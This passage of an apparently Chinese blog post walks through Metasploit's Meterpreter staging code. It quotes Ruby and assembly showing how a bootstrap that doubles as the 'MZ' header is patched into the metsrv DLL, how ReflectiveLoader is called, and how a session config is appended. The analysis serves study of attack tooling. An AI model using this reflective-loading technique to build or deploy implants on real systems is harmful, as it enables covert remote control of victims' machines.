<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stage_meterpreter</span>(opts<span style=color:#f92672>=</span>{})
    <span style=color:#75715e># Exceptions will be thrown by the mixin if there are issues.</span>
    dll, offset <span style=color:#f92672>=</span> load_rdi_dll(<span style=color:#66d9ef>MetasploitPayloads</span><span style=color:#f92672>.</span>meterpreter_path(<span style=color:#e6db74>&#39;metsrv&#39;</span>, <span style=color:#e6db74>&#39;x86.dll&#39;</span>))

    asm_opts <span style=color:#f92672>=</span> {
      <span style=color:#e6db74>rdi_offset</span>: offset,
      <span style=color:#e6db74>length</span>:     dll<span style=color:#f92672>.</span>length,
      <span style=color:#e6db74>stageless</span>:  opts<span style=color:#f92672>[</span><span style=color:#e6db74>:stageless</span><span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>true</span>
    }

    asm <span style=color:#f92672>=</span> asm_invoke_metsrv(asm_opts)

    <span style=color:#75715e># generate the bootstrap asm</span>
    bootstrap <span style=color:#f92672>=</span> <span style=color:#66d9ef>Metasm</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Shellcode</span><span style=color:#f92672>.</span>assemble(<span style=color:#66d9ef>Metasm</span><span style=color:#f92672>::</span><span style=color:#66d9ef>X86</span><span style=color:#f92672>.</span>new, asm)<span style=color:#f92672>.</span>encode_string

    <span style=color:#75715e># sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry</span>
    <span style=color:#66d9ef>if</span> bootstrap<span style=color:#f92672>.</span>length <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>62</span>
      <span style=color:#66d9ef>raise</span> <span style=color:#66d9ef>RuntimeError</span>, <span style=color:#e6db74>&#34;Meterpreter loader (x86) generated an oversized bootstrap!&#34;</span>
    <span style=color:#66d9ef>end</span>

    <span style=color:#75715e># patch the bootstrap code into the dll&#39;s DOS header...</span>
    dll<span style=color:#f92672>[</span> <span style=color:#ae81ff>0</span>, bootstrap<span style=color:#f92672>.</span>length <span style=color:#f92672>]</span> <span style=color:#f92672>=</span> bootstrap

    dll
  <span style=color:#66d9ef>end</span>
</code></pre></td></tr></table>
</div>
</div><p>这段代码里面首先取到了metsrv的dll的文件，然后传入 <code>asm_invoke_metsrv</code> 函数做处理，生成汇编字节码，然后替换这个dll的头部</p>
<p>我们看看 <code>load_rdi_dll</code> 函数，这个函数取到了一个偏移量然后传入 <code>asm_invoke_metsrv</code> 函数做处理了</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_rdi_dll</span>(dll_path)
    dll <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
    <span style=color:#f92672>::</span><span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>open(dll_path, <span style=color:#e6db74>&#39;rb&#39;</span>) { <span style=color:#f92672>|</span>f<span style=color:#f92672>|</span> dll <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read }

    offset <span style=color:#f92672>=</span> parse_pe(dll)

    <span style=color:#66d9ef>unless</span> offset
      <span style=color:#66d9ef>raise</span> <span style=color:#e6db74>&#34;Cannot find the ReflectiveLoader entry point in </span><span style=color:#e6db74>#{</span>dll_path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
    <span style=color:#66d9ef>end</span>

    <span style=color:#66d9ef>return</span> dll, offset
  <span style=color:#66d9ef>end</span>

  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>parse_pe</span>(dll)
    pe <span style=color:#f92672>=</span> <span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>PeParsey</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Pe</span><span style=color:#f92672>.</span>new(<span style=color:#66d9ef>Rex</span><span style=color:#f92672>::</span><span style=color:#66d9ef>ImageSource</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Memory</span><span style=color:#f92672>.</span>new(dll))
    offset <span style=color:#f92672>=</span> <span style=color:#66d9ef>nil</span>

    pe<span style=color:#f92672>.</span>exports<span style=color:#f92672>.</span>entries<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>e<span style=color:#f92672>|</span>
      <span style=color:#66d9ef>if</span> e<span style=color:#f92672>.</span>name <span style=color:#f92672>=~</span> <span style=color:#e6db74>/^\S*ReflectiveLoader\S*/</span>
        offset <span style=color:#f92672>=</span> pe<span style=color:#f92672>.</span>rva_to_file_offset(e<span style=color:#f92672>.</span>rva)
        <span style=color:#66d9ef>break</span>
      <span style=color:#66d9ef>end</span>
    <span style=color:#66d9ef>end</span>

    offset
  <span style=color:#66d9ef>end</span>
</code></pre></td></tr></table>
</div>
</div><p>甚至我们不用深究这些函数的具体流程，看名称就知道，这个是从dll导出表找到了ReflectiveLoader导出函数的地址</p>
<p>然后进入 <code>asm_invoke_metsrv</code> 看看</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>asm_invoke_metsrv</span>(opts<span style=color:#f92672>=</span>{})
    asm <span style=color:#f92672>=</span> <span style=color:#e6db74>%Q^
</span><span style=color:#e6db74>        ; prologue
</span><span style=color:#e6db74>          dec ebp               ; &#39;M&#39;
</span><span style=color:#e6db74>          pop edx               ; &#39;Z&#39;
</span><span style=color:#e6db74>          call $+5              ; call next instruction
</span><span style=color:#e6db74>          pop ebx               ; get the current location (+7 bytes)
</span><span style=color:#e6db74>          push edx              ; restore edx
</span><span style=color:#e6db74>          inc ebp               ; restore ebp
</span><span style=color:#e6db74>          push ebp              ; save ebp for later
</span><span style=color:#e6db74>          mov ebp, esp          ; set up a new stack frame
</span><span style=color:#e6db74>        ; Invoke ReflectiveLoader()
</span><span style=color:#e6db74>          ; add the offset to ReflectiveLoader() (0x????????)
</span><span style=color:#e6db74>          add ebx, #{&#34;0x%.8x&#34; % (opts[:rdi_offset] - 7)}
</span><span style=color:#e6db74>          call ebx              ; invoke ReflectiveLoader()
</span><span style=color:#e6db74>        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
</span><span style=color:#e6db74>          ; offset from ReflectiveLoader() to the end of the DLL
</span><span style=color:#e6db74>          add ebx, #{&#34;0x%.8x&#34; % (opts[:length] - opts[:rdi_offset])}
</span><span style=color:#e6db74>    ^</span>

    <span style=color:#66d9ef>unless</span> opts<span style=color:#f92672>[</span><span style=color:#e6db74>:stageless</span><span style=color:#f92672>]</span> <span style=color:#f92672>||</span> opts<span style=color:#f92672>[</span><span style=color:#e6db74>:force_write_handle</span><span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>true</span>
      asm <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>%Q^
</span><span style=color:#e6db74>          mov [ebx], edi        ; write the current socket/handle to the config
</span><span style=color:#e6db74>      ^</span>
    <span style=color:#66d9ef>end</span>

    asm <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>%Q^
</span><span style=color:#e6db74>          push ebx              ; push the pointer to the configuration start
</span><span style=color:#e6db74>          push 4                ; indicate that we have attached
</span><span style=color:#e6db74>          push eax              ; push some arbitrary value for hInstance
</span><span style=color:#e6db74>          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
</span><span style=color:#e6db74>    ^</span>
  <span style=color:#66d9ef>end</span>
</code></pre></td></tr></table>
</div>
</div><p>不得不说这段十分巧妙，我们想想刚才的流程是什么，排开那个 <code>mov edi, &socket</code> 不论，剩下的就是从传回来的载荷的首地址开始跑了，那假如是一个dll文件，你把一个平常的dll文件，VirtualAlloc后直接跳到地址跑，能跑起来吗？显然是不能的，我们看看msf中的处理</p>
<p>我们上面的代码分析过，这个汇编最后是替换了dll的头部，pe文件的头部就是dos头，dos头必须是MZ开头，不然这个根本算不上一个pe文件</p>
<p>那 <code>dec ebp</code> 和 <code>pop edx</code> 算怎么回事？</p>
<p>其实这两条汇编的机器码就是</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>\x4D # dec ebp
\x5A # pop edx
</code></pre></td></tr></table>
</div>
</div><p>恰好构成了MZ头，然后继续往下跑，调用了ReflectiveLoader()，这个是反射dll技术，具体代码技术细节可以见 <a href=https://github.com/stephenfewer/ReflectiveDLLInjection>https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
<p>调用该dll导出函数 <code>ReflectiveLoader</code> 的主要功能就是加载dll自身到内存中，然后返回dllmain的函数地址，返回值是在eax里面</p>
<p>然后调用 <code>mov [ebx], edi ; write the current socket/handle to the config</code> 把edi也就是上文提到的socket句柄地址存入ebx执行的内存，上面可以看到</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm> <span style=color:#75715e>; offset from ReflectiveLoader() to the end of the DLL
</span><span style=color:#75715e></span><span style=color:#a6e22e>add</span> <span style=color:#66d9ef>ebx</span>, <span style=color:#75715e>#{&#34;0x%.8x&#34; % (opts[:length] - opts[:rdi_offset])}
</span></code></pre></td></tr></table>
</div>
</div><p>这段汇编把ebx指向到了该dll加载空间的末尾</p>
<p>紧接着执行</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>push</span> <span style=color:#66d9ef>ebx</span>              <span style=color:#75715e>; push the pointer to the configuration start
</span><span style=color:#75715e></span><span style=color:#66d9ef>push</span> <span style=color:#ae81ff>4</span>                <span style=color:#75715e>; indicate that we have attached
</span><span style=color:#75715e></span><span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>              <span style=color:#75715e>; push some arbitrary value for hInstance
</span><span style=color:#75715e></span><span style=color:#66d9ef>call</span> <span style=color:#66d9ef>eax</span>              <span style=color:#75715e>; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
</span></code></pre></td></tr></table>
</div>
</div><p>调用储存在eax中的dllmain的函数</p>
<p>其中的ebx到底是什么？</p>
<p>我们把目光再往外层拉</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:              opts[:uuid].arch,
      null_session_guid: opts[:null_session_guid] == true,
      exitfunk:          ds[:exit_func] || ds[&#39;EXITFUNC&#39;],
      expiration:        (ds[:expiration] || ds[&#39;SessionExpirationTimeout&#39;]).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config] || [transport_config(opts)],
      extensions:        [],
      stageless:         opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
</code></pre></td></tr></table>
</div>
</div><p>可以看到 <code>stage_payload</code> 中把生成好的dll字节码和一串config拼接了起来，config里面的参数要分析的话又是一大块了，本文不着眼于此</p>
<p>跟进 <code>config.to_b</code> 看看</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>to_b</span>
    config_block
  <span style=color:#66d9ef>end</span>
  
  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>config_block</span>
    <span style=color:#75715e># start with the session information</span>
    config <span style=color:#f92672>=</span> session_block(@opts)

    <span style=color:#75715e># then load up the transport configurations</span>
    (@opts<span style=color:#f92672>[</span><span style=color:#e6db74>:transports</span><span style=color:#f92672>]</span> <span style=color:#f92672>||</span> <span style=color:#f92672>[]</span>)<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>t<span style=color:#f92672>|</span>
      config <span style=color:#f92672>&lt;&lt;</span> transport_block(t)
    <span style=color:#66d9ef>end</span>

    <span style=color:#75715e># terminate the transports with NULL (wchar)</span>
    config <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#34;</span>

    <span style=color:#75715e># configure the extensions - this will have to change when posix comes</span>
    <span style=color:#75715e># into play.</span>
    file_extension <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x86.dll&#39;</span>
    file_extension <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x64.dll&#39;</span> <span style=color:#66d9ef>unless</span> is_x86?

    (@opts<span style=color:#f92672>[</span><span style=color:#e6db74>:extensions</span><span style=color:#f92672>]</span> <span style=color:#f92672>||</span> <span style=color:#f92672>[]</span>)<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>e<span style=color:#f92672>|</span>
      config <span style=color:#f92672>&lt;&lt;</span> extension_block(e, file_extension)
    <span style=color:#66d9ef>end</span>

    <span style=color:#75715e># terminate the extensions with a 0 size</span>
    config <span style=color:#f92672>&lt;&lt;</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>].</span>pack(<span style=color:#e6db74>&#39;V&#39;</span>)

    <span style=color:#75715e># wire in the extension init data</span>
    (@opts<span style=color:#f92672>[</span><span style=color:#e6db74>:ext_init</span><span style=color:#f92672>]</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>cfg<span style=color:#f92672>|</span>
      name, value <span style=color:#f92672>=</span> cfg<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;,&#39;</span>)
      config <span style=color:#f92672>&lt;&lt;</span> extension_init_block(name, value)
    <span style=color:#66d9ef>end</span>

    <span style=color:#75715e># terminate the ext init config with a final null byte</span>
    config <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>

    <span style=color:#75715e># and we&#39;re done</span>
    config
  <span style=color:#66d9ef>end</span>
</code></pre></td></tr></table>
</div>
</div><p>然后我们跟进 <code>session_block</code> 和 <code>transport_block</code> 看看就能明白这就是一串配置转化为字节码，具体的转化规则我们不论</p>
<p>可以看到 函数里面有</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby>    session_data <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>
      <span style=color:#ae81ff>0</span>,                  <span style=color:#75715e># comms socket, patched in by the stager</span>
      exit_func,          <span style=color:#75715e># exit function identifer</span>
      opts<span style=color:#f92672>[</span><span style=color:#e6db74>:expiration</span><span style=color:#f92672>]</span>,  <span style=color:#75715e># Session expiry</span>
      uuid,               <span style=color:#75715e># the UUID</span>
      session_guid        <span style=color:#75715e># the Session GUID</span>
    <span style=color:#f92672>]</span>

    session_data<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;QVVA*A*&#39;</span>)
</code></pre></td></tr></table>
</div>
